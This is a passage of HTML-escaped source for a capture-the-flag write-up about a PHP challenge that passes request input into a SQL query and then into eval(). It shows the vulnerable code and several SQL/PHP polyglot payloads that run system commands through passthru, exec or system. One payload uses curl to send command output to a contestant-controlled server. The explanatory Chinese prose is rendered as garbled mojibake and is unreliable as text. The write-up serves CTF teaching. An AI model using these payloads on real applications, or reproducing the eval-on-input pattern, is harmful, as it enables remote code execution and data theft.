    &lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat /flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;‰∏äËø∞ÂâçÂçäÈÉ®ÁÇ∫Áí∞Â¢ÉÁöÑ‰ΩàÁΩÆÔºåÁúüÊ≠£È°åÁõÆÁöÑÈñãÂßãÂâáË¶ÅË¶ã‰∏ãÊñπ index.phpÔºåÂÖ∂‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_REQUEST&lt;/code&gt; ÊòØÊàëÂÄëÂèØ‰ª•‰ªªÊÑèÊéßÂà∂ÁöÑÂèÉÊï∏ÔºåÈ°åÁõÆÈô§‰∫Ü isset Â§ñ‰∏¶ÁÑ°ÂÖ∂‰ªñ‰ªª‰ΩïÊ™¢Êü•ÔºåÈö®ÂæåÁ¨¨ 8 Ë°å‰∏≠ÂèÉÊï∏Ë¢´Â∏∂ÂÖ• SQL Ë™ûÂè•‰ΩúÂü∑Ë°åÔºåÂ¶ÇÊûú SQL Âü∑Ë°åÊàêÂäü‰∏¶‰∏îÊúâÊü•Ë©¢Âà∞Ë≥áÊñôÔºåÂ∞±ÊúÉÈÄ≤ÂÖ• 15 Ë°åÈñãÂßãÁöÑËôïÁêÜÔºå‰æÜËá™ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_REQUEST&lt;/code&gt; ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$column&lt;/code&gt; ËÆäÊï∏ÂÜçÊ¨°Ë¢´‰ΩøÁî®‰∏¶ÂÇ≥ÂÖ• eval ‰ΩúÂü∑Ë°åÔºåÈÄôÊ®£Áúã‰∏ã‰æÜÈ°åÁõÆÁöÑËß£È°åÊÄùË∑ØÂ∞±ÂæàÊ∏ÖÊ•ö‰∫ÜÔºåÊàëÂÄëÈúÄË¶ÅÊßãÈÄ†‰∏ÄÂÄãÂ≠ó‰∏≤ÔºåÂêåÊôÇÁÇ∫ÂêàÊ≥ïÁöÑ SQL Ë™ûÂè•Ëàá PHP Ë™ûÂè•ÔºåËÆì SQL Âü∑Ë°åÊôÇÊúâÂõûÂÇ≥ÂÄº‰∏î PHP Âü∑Ë°åÊôÇËÉΩÂ§†Âü∑Ë°å‰ªªÊÑèÁ≥ªÁµ±Êåá‰ª§ÔºåÂ∞±ËÉΩ getshell ‰∏¶ÂëºÂè´ /readflag ÂèñÂæó flagÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;index.php&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;column&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;No input&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;column&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;select &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; from mytable where id =&apos;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&apos;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysqli_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;mysql&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;youtu.be/l11uaEjA-iI&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;sqltest&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_num_rows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_fetch_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;output = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;row-&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Database error&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;Âá∫È°åËÄÖËß£Ê≥ï&quot;&gt;Âá∫È°åËÄÖËß£Ê≥ï&lt;/h2&gt;

&lt;p&gt;Ë∫´ÁÇ∫Âá∫È°åËÄÖÔºåÁï∂ÁÑ∂ÂøÖÈ†àÂÖàÊããÁ£ö‰∏Ä‰∏ãÊâçËÉΩÂ§†ÂºïÁéâÔΩû&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;exploit:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column={passthru(&apos;/readflag&apos;)}&amp;amp;id=1

SQL: SELECT {passthru(&apos;/readflag&apos;)} FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;{passthru(&apos;/readflag&apos;)};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄôÂÄãËß£Ê≥ïÂà©Áî®‰∫Ü MySQL ‰∏ÄÂÄãÁõ∏ÂÆπÊÄßÁöÑÁâπÊÄßÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{identifier expr}&lt;/code&gt; ÊòØ ODBC Escape Ë™ûÊ≥ïÔºåMySQL Áõ∏ÂÆπ‰∫ÜÈÄôÂÄãË™ûÊ≥ïÔºå‰ΩøÂæóÂú®Ë™ûÂè•‰∏≠Âá∫ÁèæÊôÇ‰∏çÊúÉÂ∞éËá¥Ë™ûÊ≥ïÈåØË™§ÔºåÂõ†Ê≠§ÊàëÂÄëÂèØ‰ª•ÊßãÈÄ†Âá∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT {passthru &apos;/readflag&apos;} FROM mytable WHERE id = &apos;1&apos;&lt;/code&gt; Â≠ó‰∏≤‰ªçÁÑ∂ÊúÉÊòØÂêàÊ≥ïÁöÑ SQL Ë™ûÂè•ÔºåÊõ¥ÈÄ≤‰∏ÄÊ≠•Âú∞ÂòóË©¶Â∞á ODBC Escape ‰∏≠ÁöÑÁ©∫ÁôΩÁßªÈô§Êîπ‰ª•Êã¨ËôüÂåÖÂ§æÂ≠ó‰∏≤ÁöÑË©±ÔºåÊúÉËÆäÊàê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT {passthru(&apos;/readflag&apos;)} FROM mytable WHERE id = &apos;1&apos;&lt;/code&gt;ÔºåÁî±Êñº MySQL Êèê‰æõÁöÑË™ûÊ≥ïÂΩàÊÄßÔºåÊ≠§ÊÆµË™ûÂè•‰ªçÁÑ∂ÊúÉË¢´Ë¶ñÁÇ∫ÂêàÊ≥ï‰∏¶‰∏îÂèØÊ≠£Â∏∏Âü∑Ë°åÂæóÂà∞Áõ∏ÂêåÁµêÊûú„ÄÇ&lt;/p&gt;

&lt;p&gt;Êé•ËëóÂÜçÁúãÈÄ≤Âà∞ eval ÂâçÊúÉÊßãÈÄ†Âá∫ÈÄôÊ®£ÁöÑ PHP Ë™ûÂè•Ôºö&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$output = $row-&amp;gt;{passthru(&apos;/readflag&apos;)}&lt;/code&gt;ÔºåÁî±Êñº PHP Âú®Ë™ûÊ≥ï‰∏ä‰πüÊèê‰æõ‰∫ÜÊ•µÂ§ßÁöÑÂΩàÊÄßÔºå‰ΩøÂæóÊàëÂÄëÂèØ‰ª•Âà©Áî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$object-&amp;gt;{ expr }&lt;/code&gt; ÈÄôÊ®£ÁöÑË™ûÊ≥ïÂ∞á expr ÊïòËø∞Âè•ÂãïÊÖãÂü∑Ë°åÂÆåÁöÑÁµêÊûú‰ΩúÁÇ∫Áâ©‰ª∂Â±¨ÊÄßÂêçÁ®±ÂéªÂ≠òÂèñÁâ©‰ª∂ÁöÑÂ±¨ÊÄßÔºåÂõ†Ê≠§ÁµêÊûúÂ∞±ÊúÉÂëºÂè´ passthru ÂáΩÂºèÂü∑Ë°åÁ≥ªÁµ±Êåá‰ª§„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÈÇäË£úÂÖÖ‰∏ÄÂÄãÂÜ∑Áü•Ë≠òÔºåÁï∂ÊÉ≥Âà∞Á≥ªÁµ±Êåá‰ª§ÊôÇÔºåÂ§ßÂÆ∂Áõ¥Ë¶∫ÂèØËÉΩÊúÉÊÉ≥Âà∞‰ΩøÁî® system ÂáΩÂºèÔºå‰ΩÜÊòØ MySQL Âú® 8.0.3 ‰∏≠Â∞á system Âä†ÂÖ•ÈóúÈçµÂ≠ó‰øùÁïôÂ≠ó‰πã‰∏≠ÔºåËÄåÈÄôÈ°åÁõÆÁí∞Â¢ÉÊòØ‰ΩøÁî® MySQL 8.0 Êû∂Ë®≠ÁöÑÔºåÊâÄ‰ª•Â¶ÇÊûú‰ΩøÁî® system ÁöÑË©±ÂèçËÄåÊúÉÂ§±ÊïóÂî∑ÔºÅ&lt;/p&gt;

&lt;h2 id=&quot;‰æÜËá™ÊúÉÁúæÊúãÂèãÂÄëÁöÑËß£Ê≥ï&quot;&gt;‰æÜËá™ÊúÉÁúæÊúãÂèãÂÄëÁöÑËß£Ê≥ï&lt;/h2&gt;

&lt;p&gt;Áî±ÊñºÊúãÂèãÂÄëË∏¥Ë∫çÊèê‰∫§ÁöÑËß£Ê≥ïÁúæÂ§öÔºåÊâÄ‰ª•ÊàëÂÄëÂ∞áÂêÑËß£Ê≥ïÁ∞°ÂñÆÂÅö‰∫ÜÂàÜÁµÑÔºåÂè¶Â§ñÊèêÈÜí‰∏Ä‰∏ãÔºå‰ª•‰∏ãÈ†ÜÂ∫èÂè™ÊòØÊèê‰∫§ÁöÑÂÖàÂæåÊôÇÈñìÂ∑ÆÔºå‰∏¶ÁÑ°‰ªª‰ΩïÂÑ™Âä£ÔºåËÉΩÂèñÂæó flag ÁöÑËß£Ê≥ïÈÉΩÊòØÂ•ΩËß£Ê≥ïÔºÅÊé•‰∏ã‰æÜÂ∞±ËÆìÊàëÂÄëÈÄ≤Ë°å‰ªãÁ¥πÂêß„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;odbc-escape&quot;&gt;ODBC Escape&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;by Mico (https://www.facebook.com/MicoDer/):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column={exec(%27curl%20http://Mico_SRV/?`/readflag`%27)};%23&amp;amp;id=1

SQL: SELECT {exec(&apos;curl http://Mico_SRV/?`/readflag`&apos;)};# FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;{exec(&apos;curl http://Mico_SRV/?`/readflag`&apos;)};#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄôÂÄãËß£Ê≥ïËàáÂá∫È°åËÄÖÁöÑÂçÅÂàÜÈ°û‰ººÔºå‰ΩÜÊ≤íÊúâ‰ΩøÁî®ÂèØ‰ª•Áõ¥Êé•Ëº∏Âá∫ÁµêÊûúÁöÑ passthru ËÄåÊòØÊîπÁî® execÔºåÊé•ËëóÈÄèÈÅé curl ÊääÁµêÊûúÂõûÂÇ≥Ëá≥Ëá™Â∑±ÁöÑ‰º∫ÊúçÂô®ÔºåÊìöÊú¨‰∫∫Ë™™Ê≥ïÊòØÂõ†ÁÇ∫„ÄåË¶∫ÂæóÈß≠ÂÆ¢Â∞±Ë©≤ÂÇ≥‰∫õ‰ªÄÈ∫ºÂõû‰æÜËá™Â∑±Server XD „ÄçXD„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;comment-everywhere&quot;&gt;Comment Everywhere&lt;/h3&gt;

&lt;p&gt;Âπæ‰πéÊâÄÊúâÁ®ãÂºèË™ûË®ÄÈÉΩÊúâË®ªËß£Á¨¶ËôüÂèØ‰ª•ËÆìÈñãÁôº‰∫∫Âì°Âú®Á®ãÂºèÁ¢º‰∏≠ÈñìÂä†‰∏äÊñáÂ≠óË™™ÊòéÔºå‰ª•‰æø‰∏ã‰∏ÄÂÄãÈñãÁôº‰∫∫Âì°Êé•ÊâãÊôÇÂèØ‰ª•Âø´ÈÄüÁêÜËß£ÈÄôÊÆµÁ®ãÂºèÁ¢ºÁöÑÊÑèÁæ©„ÄÇÁï∂ÁÑ∂ SQL Ëàá PHP ‰πüÊúâÂêÑËá™ÁöÑË®ªËß£Á¨¶ËôüÔºå‰ΩÜÂÆÉÂÄëÊâÄÊîØÊè¥ÁöÑÁ¨¶ËôüË°®Á§∫Á®çÂæÆÊúâ‰∫õÂ∑ÆÁï∞ÔºåËÄåÈÄôÂ∞èÂ∑ÆÁï∞Â∞±ÂèØ‰ª•Âπ´Âä©ÊàëÂÄëÈÅîÊàêÁõÆÁöÑ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by LJP (https://ljp-tw.github.io/blog/)&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id%0a-- /*%0a-- */ ; system(&apos;/readflag&apos;);%0a&amp;amp;id=1

SQL: SELECT id
     -- /*
     -- */ ; system(&apos;/readflag&apos;);
     FROM mytable WHERE id = &apos;1&apos;
PHP: $output = id
     -- /*
     -- */ ; system(&apos;/readflag&apos;);
     ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄôÂÄãËß£Ê≥ïÁúã‰ººË§áÈõúÔºåÊú¨Ë≥™‰∏äÂÖ∂ÂØ¶ÂæàÂñÆÁ¥îÔºåÂ∞±ÊòØÂà©Áî®ÂÖ©ÂÄãË™ûË®ÄÊîØÊè¥‰∏çÂêåË®ªËß£Á¨¶ËôüÁöÑÁâπÊÄß„ÄÇÂ∞çÊñº SQL ËÄåË®ÄÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; ÊòØË®ªËß£Á¨¶ËôüÔºåÊúÉÁÑ°Ë¶ñÂæåÊñπÊâÄÊúâÂà∞ÊèõË°åÁÇ∫Ê≠¢ÁöÑÊñáÂ≠óÔºåÊâÄ‰ª•ÊØè‰∏ÄË°å‰ª• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; ÈñãÈ†≠ÁöÑÂ≠ó‰∏≤ÔºåSQL ÊòØÁúã‰∏çË¶ãÁöÑ„ÄÇÊé•Ëëó‰æÜÁúã PHPÔºåÂ∞çÊñº PHP ËÄåË®ÄÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/* ‰ªª‰ΩïÂ≠ó‰∏≤ */&lt;/code&gt; ÈÄôÊòØË®ªËß£ÁöÑË°®Á§∫ÊñπÂºèÔºåÈñãÈ†≠ÁµêÂ∞æÁî± / Ëàá * ÁµÑÊàêÔºå‰∏≠ÈñìË¢´ÂåÖÂ§æÁöÑÂ≠ó‰∏≤ÊòØÁúã‰∏çË¶ãÁöÑÔºå‰∏¶‰∏îÊîØÊè¥ÊèõË°åÔºåËÄå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; Âú® PHP ‰πã‰∏≠Ââá‰ª£Ë°®ÈÅûÊ∏õÈÅãÁÆóÂ≠êÔºåÊâÄ‰ª•Â¶Ç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$output --&lt;/code&gt; Â≠ó‰∏≤ÂÖ∂ÂØ¶ÊòØÂú®Â∞ç $output ÈÄ≤Ë°åÊ∏õ 1 ÁöÑÊìç‰Ωú„ÄÇÁ∂úÂêà‰∏äÈù¢ÁâπÊÄßÔºåÂ∞çÊñº‰∏äÈù¢ÁöÑËß£Ê≥ïÔºåÂÖ∂ÂØ¶Âè™Êúâ PHP ÁúãË¶ãÁöÑÁ¨¨‰∏âË°å ` ; system(‚Äò/readflag‚Äô);` ÊúÉË™çÁÇ∫ÊòØÈúÄË¶ÅÂü∑Ë°åÁöÑÁ®ãÂºèÁ¢ºÔºåÂÖ∂È§òÈÉ®ÂàÜ‰∏çË´ñÊòØ SQL ÈÇÑÊòØ PHP ÈÉΩ‰ª•ÁÇ∫ÊòØË®ªËß£ÁöÑÂ≠ó‰∏≤ËÄåÁÑ°Ë¶ñÔºåÂõ†Ê≠§ÂèØ‰ª•È†ÜÂà©Âü∑Ë°åÂèñÂæó flag„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by ankleboy (https://www.facebook.com/profile.php?id=100001963625238):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name%20/*!%20from%20mytable%20*/%20--%20;%20system(%22/readflag%22)&amp;amp;id=1

SQL: SELECT name /*! from mytable */ -- ; system(&quot;/readflag&quot;) FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;name /*! from mytable */ -- ; system(&quot;/readflag&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ê≠§Ëß£Ê≥ï‰πüÊòØÂêåÊ®£ÈÅãÁî®Ë®ªËß£Ôºå‰ΩÜ‰ΩøÁî®ÁöÑË®ªËß£Á¨¶Ëôü‰ºº‰πéÁ®çÂæÆÁâπÊÆäÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/* */&lt;/code&gt; Èô§‰∫Ü PHP ‰πãÂ§ñÔºåMySQL ‰πüÂêåÊ®£ÊîØÊè¥Ê≠§ÂÖÅË®±Â§öË°åÁöÑË®ªËß£Á¨¶ËôüÔºå‰ΩÜÂÅáÂ¶ÇÂ§ö‰∏ä‰∏ÄÂÄãÈ©öÂòÜËôü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*! */&lt;/code&gt;Ôºå‰∫ãÊÉÖÂ∞±ÂèàÁ®çÂæÆ‰∏çÂêå‰∫ÜÔºåÈÄôÊòØ MySQL ÁâπÊúâÁöÑËÆäÁ®ÆË®ªËß£Á¨¶ËôüÔºåÂú®Ê≠§Á¨¶Ëôü‰∏≠ÁöÑÂ≠ó‰∏≤Ôºå‰ªçÁÑ∂ÊúÉË¢´ MySQL Áï∂Êàê SQL ÁöÑ‰∏ÄÈÉ®ÂàÜÂü∑Ë°åÔºå‰ΩÜÂú®ÂÖ∂‰ªñ DBMS ‰πã‰∏≠ÔºåÂõ†ÁÇ∫ÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*&lt;/code&gt; ÈñãÈ†≠Â∞±ÊúÉË™çÁÇ∫ÂÆÉÂ∞±ÊòØÂñÆÁ¥îÁöÑË®ªËß£ÊñáÂ≠óËÄåÂøΩË¶ñÔºåËÆìÈñãÁôº‰∫∫Âì°ËÉΩÊí∞ÂØ´ÂèØ portable ÁöÑÁ®ãÂºèÁ¢º„ÄÇÂõ†Ê≠§Â∞±ËÉΩË£ΩÈÄ†Âá∫‰∏Ä‰∏≤Ë®ªËß£ÊñáÂ≠óÂèØË¢´ MySQL ÁúãË¶ã‰ΩÜÁÑ°Ê≥ïË¢´ PHP ÁúãË¶ãÔºåÂº∑Âà∂Âú®Ë®ªËß£ÊñáÂ≠óË£°ËÆì SQL ÊßãÈÄ†ÂêàÊ≥ïË™ûÂè•ÔºåÂÜçÂà©Áî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; Ë®ªËß£ÈñâÂêàÊâÄÊúâÂÜóË¥Ö SQL Ë™ûÂè•ÔºåÁ∑äÊé•Ëëó &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; ÂæåÂ∞±ËÉΩÊí∞ÂØ´‰ªªÊÑè PHP Âü∑Ë°åÁ¢º„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by FI:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`%23?&amp;gt;&amp;amp;id=1

SQL: SELECT id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&amp;gt; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

